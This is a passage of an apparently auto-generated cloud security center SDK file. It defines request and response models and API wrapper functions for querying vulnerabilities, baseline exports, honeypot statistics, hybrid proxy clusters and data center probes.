  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 10.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9BFA6D78-07EA-5C0A-9358-E4434573507B'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeGroupedVulResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeGroupedVulResponseBody(name='body'),
}

/**
 * @summary Queries vulnerabilities by group.
 *
 * @param request DescribeGroupedVulRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeGroupedVulResponse
 */
async function describeGroupedVulWithOptions(request: DescribeGroupedVulRequest, runtime: Util.RuntimeOptions): DescribeGroupedVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries vulnerabilities by group.
 *
 * @param request DescribeGroupedVulRequest
 * @return DescribeGroupedVulResponse
 */
async function describeGroupedVul(request: DescribeGroupedVulRequest): DescribeGroupedVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedVulWithOptions(request, runtime);
}

model DescribeHcExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.

>  You can call the [ExportWarning](~~ExportWarning~~) operation to query the IDs of export tasks.', example='443285'),
}

model DescribeHcExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='148'),
  fileName?: string(name='FileName', description='The name of the exported file.', example='health_check_export_2022****'),
  gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='2022-11-03T15:15Z'),
  id?: long(name='Id', description='The ID of the export task.', example='1082278'),
  link?: string(name='Link', description='The download URL for the exported file.', example='https://hc-export.oss-cn-shanghai.aliyuncs.com/export_hc/health_check_export_20221222_1671699255808.zip?Expires=1672304056&OSSAccessKeyId=****&Signature=****'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='89'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3C2C94CF-ED08-50C0-BC72-C5029251****'),
  resultStatus?: string(name='ResultStatus', description='The status of the export task. Valid values:

*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='exporting'),
  totalCount?: int32(name='TotalCount', description='The total number of exported entries.', example='624'),
}

model DescribeHcExportInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeHcExportInfoResponseBody(name='body'),
}

/**
 * @summary Queries the information about baseline export, including the name of the file to which baselines are exported and the download URL for the file.
 *
 * @param request DescribeHcExportInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeHcExportInfoResponse
 */
async function describeHcExportInfoWithOptions(request: DescribeHcExportInfoRequest, runtime: Util.RuntimeOptions): DescribeHcExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHcExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about baseline export, including the name of the file to which baselines are exported and the download URL for the file.
 *
 * @param request DescribeHcExportInfoRequest
 * @return DescribeHcExportInfoResponse
 */
async function describeHcExportInfo(request: DescribeHcExportInfoRequest): DescribeHcExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHcExportInfoWithOptions(request, runtime);
}

model DescribeHoneyPotAuthRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model DescribeHoneyPotAuthResponseBody = {
  honeyPotAuthCount?: long(name='HoneyPotAuthCount', description='The total quota.', example='10'),
  honeyPotCount?: int32(name='HoneyPotCount', description='The quota that is consumed.', example='4'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0F5023B6-9C1F-459F-ACCC-8B4636804037'),
}

model DescribeHoneyPotAuthResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeHoneyPotAuthResponseBody(name='body'),
}

/**
 * @summary Queries statistics on the quota of honeypots.
 *
 * @param request DescribeHoneyPotAuthRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeHoneyPotAuthResponse
 */
async function describeHoneyPotAuthWithOptions(request: DescribeHoneyPotAuthRequest, runtime: Util.RuntimeOptions): DescribeHoneyPotAuthResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotAuth',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries statistics on the quota of honeypots.
 *
 * @param request DescribeHoneyPotAuthRequest
 * @return DescribeHoneyPotAuthResponse
 */
async function describeHoneyPotAuth(request: DescribeHoneyPotAuthRequest): DescribeHoneyPotAuthResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotAuthWithOptions(request, runtime);
}

model DescribeHoneyPotSuspStatisticsRequest {
  from?: string(name='From', description='The source of the request. Set the value to **honeypot**.

This parameter is required.', example='honeypot'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  statisticsDays?: int32(name='StatisticsDays', description='The time range of the data to query. Unit: days.

This parameter is required.', example='30'),
  statisticsKeyType?: string(name='StatisticsKeyType', description='The type of the asset to query. Valid values:

*   **vpcInstanceId**: VPC
*   **uuid**: server

This parameter is required.', example='vpcInstanceId'),
}

model DescribeHoneyPotSuspStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9E3969FA-5ACC-4256-9FDE-BB6918CD0410'),
  suspHoneyPotStatisticsResponse?: [ 
    {
      count?: int32(name='Count', description='The total number of alerts that are generated for the asset.', example='8793'),
      instanceId?: string(name='InstanceId', description='The ID of the server.

> This parameter is returned only when **StatisticsKeyType** is set to **uuid**.', example='i-p0whhoba24wd28p8****'),
      instanceName?: string(name='InstanceName', description='The name of the server.

> This parameter is returned only when **StatisticsKeyType** is set to **uuid**.', example='abc-launch-advisor'),
      type?: string(name='Type', description='The type of the asset. Valid values:

*   **vpcInstanceId**: VPC
*   **uuid**: server', example='vpcInstanceId'),
      vpcId?: string(name='VpcId', description='The ID of the VPC.

> This parameter is returned only when **StatisticsKeyType** is set to **vpcInstanceId**.', example='vpc-p0wwdsuutdyu1ygkt****'),
      vpcName?: string(name='VpcName', description='The name of the VPC.

> This parameter is returned only when **StatisticsKeyType** is set to **vpcInstanceId**.', example='abc01'),
    }
  ](name='SuspHoneyPotStatisticsResponse', description='An array that consists of the top 5 VPCs or assets for which alerts are most frequently generated.'),
}

model DescribeHoneyPotSuspStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeHoneyPotSuspStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the top five virtual private clouds (VPCs) or assets for which alerts are most frequently generated.
 *
 * @param request DescribeHoneyPotSuspStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeHoneyPotSuspStatisticsResponse
 */
async function describeHoneyPotSuspStatisticsWithOptions(request: DescribeHoneyPotSuspStatisticsRequest, runtime: Util.RuntimeOptions): DescribeHoneyPotSuspStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.statisticsDays)) {
    query['StatisticsDays'] = request.statisticsDays;
  }
  if (!Util.isUnset(request.statisticsKeyType)) {
    query['StatisticsKeyType'] = request.statisticsKeyType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotSuspStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the top five virtual private clouds (VPCs) or assets for which alerts are most frequently generated.
 *
 * @param request DescribeHoneyPotSuspStatisticsRequest
 * @return DescribeHoneyPotSuspStatisticsResponse
 */
async function describeHoneyPotSuspStatistics(request: DescribeHoneyPotSuspStatisticsRequest): DescribeHoneyPotSuspStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotSuspStatisticsWithOptions(request, runtime);
}

model DescribeHybridProxyClusterListRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster.', example='test'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
}

model DescribeHybridProxyClusterListResponseBody = {
  clusterList?: [ 
    {
      authKey?: string(name='AuthKey', description='The ID of the credential that is used for cluster authentication.', example='test'),
      authKeySecret?: string(name='AuthKeySecret', description='The key of the credential that is used for cluster authentication.', example='test'),
      clientCount?: int32(name='ClientCount', description='The number of servers that are connected to the proxy cluster.', example='10'),
      clusterName?: string(name='ClusterName', description='The name of the proxy cluster.', example='idc-sas-proxy'),
      installCommand?: string(name='InstallCommand', description='The installation command for the node of the proxy cluster.', example='test'),
      ip?: string(name='Ip', description='The endpoint of the cluster. An IP address or a domain name is specified.', example='114.115.XXX.XXX'),
      lastHeartTime?: long(name='LastHeartTime', description='The timestamp when the cluster last sent a heartbeat message. Unit: milliseconds.', example='1608304654000'),
      proxyCount?: int32(name='ProxyCount', description='The number of proxy nodes.', example='3'),
      remark?: string(name='Remark', description='The description of the proxy cluster.', example='test'),
      status?: string(name='Status', description='The status of the cluster.', example='offline'),
    }
  ](name='ClusterList', description='The proxy clusters.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='C1A36413-50B2-5B2F-843F-EB14C582713F'),
}

model DescribeHybridProxyClusterListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeHybridProxyClusterListResponseBody(name='body'),
}

/**
 * @summary Queries proxy clusters by page.
 *
 * @param request DescribeHybridProxyClusterListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeHybridProxyClusterListResponse
 */
async function describeHybridProxyClusterListWithOptions(request: DescribeHybridProxyClusterListRequest, runtime: Util.RuntimeOptions): DescribeHybridProxyClusterListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHybridProxyClusterList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries proxy clusters by page.
 *
 * @param request DescribeHybridProxyClusterListRequest
 * @return DescribeHybridProxyClusterListResponse
 */
async function describeHybridProxyClusterList(request: DescribeHybridProxyClusterListRequest): DescribeHybridProxyClusterListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHybridProxyClusterListWithOptions(request, runtime);
}

model DescribeHybridProxyLinkedClientListRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster. You can query the name of the proxy cluster in the Security Center console.', example='office-proxy'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  proxyUuid?: string(name='ProxyUuid', description='The UUID of the proxy node. You can call the DescribeHybridProxyList operation to query the UUID of the proxy node.', example='inet-proxy-3bb11fad-37d6-4aee-9c37-b0ad1612XXXX'),
  remark?: string(name='Remark', description='The description of the proxy cluster.', example='test'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the Security Center agent is installed. You can query the UUID by querying asset information.', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f89ca****'),
}

model DescribeHybridProxyLinkedClientListResponseBody = {
  list?: [ 
    {
      groupName?: string(name='GroupName', description='The name of the server group.', example='default'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-bp1a69mvjujbakxu****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='172.25.XX.XX'),
      os?: string(name='Os', description='The name of the operating system.', example='centos-xxx'),
      osName?: string(name='OsName', description='The name of the operating system for your asset.', example='centos'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      regionName?: string(name='RegionName', description='The name of the region in which the server resides.', example='cn-qingdao'),
      status?: string(name='Status', description='The status of the Security Center agent.', example='online'),
      tag?: string(name='Tag', description='The name of the tag added to the server.', example='latest'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      vendorName?: string(name='VendorName', description='The name of the service provider.', example='ALIYUN'),
    }
  ](name='List', description='The returned data.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='B01B804F-947C-5623-B050-1C8FDFA796CF'),
}

model DescribeHybridProxyLinkedClientListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeHybridProxyLinkedClientListResponseBody(name='body'),
}

/**
 * @summary Queries the servers that are connected to a proxy in a hybrid cloud by page.
 *
 * @param request DescribeHybridProxyLinkedClientListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeHybridProxyLinkedClientListResponse
 */
async function describeHybridProxyLinkedClientListWithOptions(request: DescribeHybridProxyLinkedClientListRequest, runtime: Util.RuntimeOptions): DescribeHybridProxyLinkedClientListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.proxyUuid)) {
    query['ProxyUuid'] = request.proxyUuid;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHybridProxyLinkedClientList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers that are connected to a proxy in a hybrid cloud by page.
 *
 * @param request DescribeHybridProxyLinkedClientListRequest
 * @return DescribeHybridProxyLinkedClientListResponse
 */
async function describeHybridProxyLinkedClientList(request: DescribeHybridProxyLinkedClientListRequest): DescribeHybridProxyLinkedClientListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHybridProxyLinkedClientListWithOptions(request, runtime);
}

model DescribeHybridProxyListRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster.', example='idc-sas-proxy'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20'),
}

model DescribeHybridProxyListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  proxyList?: [ 
    {
      clientCount?: int32(name='ClientCount', description='The number of servers that are connected to the proxy instance.', example='10'),
      currentVersion?: string(name='CurrentVersion', description='The version of the proxy instance.', example='proxy_01_05'),
      instanceId?: string(name='InstanceId', description='The instance ID.', example='i-uf61q03boqhhmeai1XXX'),
      instanceName?: string(name='InstanceName', description='The instance name.', example='dev'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.76.XXX.XXX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.23.XXX.XXX'),
      proxyUuid?: string(name='ProxyUuid', description='The UUID of the proxy node.', example='inet-proxy-3bb11fad-37d6-4aee-9c37-b0ad1612a18e'),
      status?: string(name='Status', description='The status of the proxy server. Valid values:

*   **online**
*   **offline**', example='online'),
      uuid?: string(name='Uuid', description='The UUID of the server that is connected to the proxy instance.', example='59a9d158-b2f0-4766-a893-ae67b943XXXX'),
    }
  ](name='ProxyList', description='The information about the proxy clusters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='75801E5D-E2EB-5C1D-B65D-2F7D2B00EF93'),
}

model DescribeHybridProxyListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeHybridProxyListResponseBody(name='body'),
}

/**
 * @summary Queries the proxy nodes that are deployed in a proxy cluster by page.
 *
 * @param request DescribeHybridProxyListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeHybridProxyListResponse
 */
async function describeHybridProxyListWithOptions(request: DescribeHybridProxyListRequest, runtime: Util.RuntimeOptions): DescribeHybridProxyListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHybridProxyList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the proxy nodes that are deployed in a proxy cluster by page.
 *
 * @param request DescribeHybridProxyListRequest
 * @return DescribeHybridProxyListResponse
 */
async function describeHybridProxyList(request: DescribeHybridProxyListRequest): DescribeHybridProxyListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHybridProxyListWithOptions(request, runtime);
}

model DescribeHybridProxyPolicyRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster. You can query the name of the proxy cluster in the Security Center console.

This parameter is required.', example='test-idc'),
}

model DescribeHybridProxyPolicyResponseBody = {
  count?: int32(name='Count', description='The number of entries on the current page.', example='1'),
  policyList?: [ 
    {
      info?: [ 
        {
          config?: string(name='Config', description='The value of the policy configurations.', example='10'),
          fileName?: string(name='FileName', description='The name of the file. After you configure a blocking policy, the blocked data is written to the file.', example='test'),
          type?: string(name='Type', description='The type of the policy that you configured. Valid values:

*   **file**
*   **net**
*   **process**', example='file'),
        }
      ](name='Info', description='The information about the policy.'),
      policyType?: string(name='PolicyType', description='The type of the policy. Valid values:

*   **limitFrequency**
*   **limitBandWidth**', example='limitBandWidth'),
    }
  ](name='PolicyList', description='The data collection configurations of the proxy cluster.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F7A1B40A-7EED-55A0-BCBC-2F83A486F0AB'),
}

model DescribeHybridProxyPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeHybridProxyPolicyResponseBody(name='body'),
}

/**
 * @summary Queries the data collection configurations of a proxy cluster.
 *
 * @param request DescribeHybridProxyPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeHybridProxyPolicyResponse
 */
async function describeHybridProxyPolicyWithOptions(request: DescribeHybridProxyPolicyRequest, runtime: Util.RuntimeOptions): DescribeHybridProxyPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHybridProxyPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the data collection configurations of a proxy cluster.
 *
 * @param request DescribeHybridProxyPolicyRequest
 * @return DescribeHybridProxyPolicyResponse
 */
async function describeHybridProxyPolicy(request: DescribeHybridProxyPolicyRequest): DescribeHybridProxyPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHybridProxyPolicyWithOptions(request, runtime);
}

model DescribeIdcAssetCriteriaRequest {
  status?: int32(name='Status', description='The status of the IP address. Valid values:

*   **0**: The IP address is valid.
*   **1**: The IP address is ignored.
*   *2*: The IP address is invalid.
*   *3*: The IP address is expired.
*   *4*: The probe that is used to scan the IP address does not exist.', example='0'),
  value?: string(name='Value', description='The keyword that is used to match assets in fuzzy mode.', example='testwww'),
}

model DescribeIdcAssetCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='scannedIp'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='select'),
      values?: string(name='Values', description='The attribute values of the assets that match the keyword.', example='1.1.1.*'),
    }
  ](name='CriteriaList', description='The information about the asset search conditions.'),
  requestId?: string(name='RequestId', description='The request ID.', example='11C96623-E106-59C9-866D-A6C82911****'),
}

model DescribeIdcAssetCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeIdcAssetCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries the search conditions that can be used to query data center assets found after scanning in fuzzy match mode.
 *
 * @param request DescribeIdcAssetCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeIdcAssetCriteriaResponse
 */
async function describeIdcAssetCriteriaWithOptions(request: DescribeIdcAssetCriteriaRequest, runtime: Util.RuntimeOptions): DescribeIdcAssetCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeIdcAssetCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the search conditions that can be used to query data center assets found after scanning in fuzzy match mode.
 *
 * @param request DescribeIdcAssetCriteriaRequest
 * @return DescribeIdcAssetCriteriaResponse
 */
async function describeIdcAssetCriteria(request: DescribeIdcAssetCriteriaRequest): DescribeIdcAssetCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeIdcAssetCriteriaWithOptions(request, runtime);
}

model DescribeIdcProbeListRequest {
  currentPage?: int32(name='CurrentPage', description='Sets the page number from which to start displaying the query results. The default value is 1, indicating that the display starts from the first page.', example='1'),
  idcName?: string(name='IdcName', description='The name of the IDC.', example='3K IDC'),
  pageSize?: int32(name='PageSize', description='Specifies the maximum number of data entries to display per page in a paginated query. The default number of data entries per page is 20, and if the PageSize parameter is empty, it will default to returning 20 data entries.
> It is recommended that the PageSize value is not empty.', example='20'),
  status?: int32(name='Status', description='Probe status. Values:

- **0**: Enabled
- **1**: Disabled', example='0'),
}

model DescribeIdcProbeListResponseBody = {
  idcProbes?: [ 
    {
      idcName?: string(name='IdcName', description='IDC data center name.', example='3K IDC'),
      idcRegion?: string(name='IdcRegion', description='Region.', example='cn-hangzhou'),
      instanceId?: string(name='InstanceId', description='Instance ID of the asset.', example='i-xxxxx'),
      instanceName?: string(name='InstanceName', description='Instance name.', example='oraclexxx'),
      internetIp?: string(name='InternetIp', description='Public IP address.', example='47.98.*.*'),
      intervalPeriod?: int32(name='IntervalPeriod', description='Scan period.', example='16'),
      intranetIp?: string(name='IntranetIp', description='Private IP of the instance.', example='10.68.*.*'),
      ipSegments?: string(name='IpSegments', description='IP segment range.', example='192.168.1.0/24'),
      linuxPort?: string(name='LinuxPort', description='Linux port.', example='22'),
      periodUnit?: string(name='PeriodUnit', description='The unit of the scan period, with values:
- **day**: day.
- **hour**: hour.', example='day'),
      serviceStatus?: int32(name='ServiceStatus', description='Probe service status. Values:

- **0**: Active
- **1**: Inactive', example='0'),
      status?: int32(name='Status', description='Probe status. Values:

- **0**: Enabled
- **1**: Disabled', example='0'),
      uuid?: string(name='Uuid', description='Server UUID.', example='inet-eae02b9a-1dbd-44a6-844c-69072b27****'),
      winPort?: string(name='WinPort', description='Windows port.', example='3389'),
    }
  ](name='IdcProbes', description='IDC probe list.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of data entries displayed on the current page in a paginated query.', example='17'),
    currentPage?: int32(name='CurrentPage', description='The page number in a paginated query.', example='1'),
    pageSize?: int32(name='PageSize', description='The maximum number of data entries to display per page in a paginated query.', example='20'),
    totalCount?: int32(name='TotalCount', description='Total number of entries.', example='30'),
  }(name='PageInfo', description='Pagination information.'),
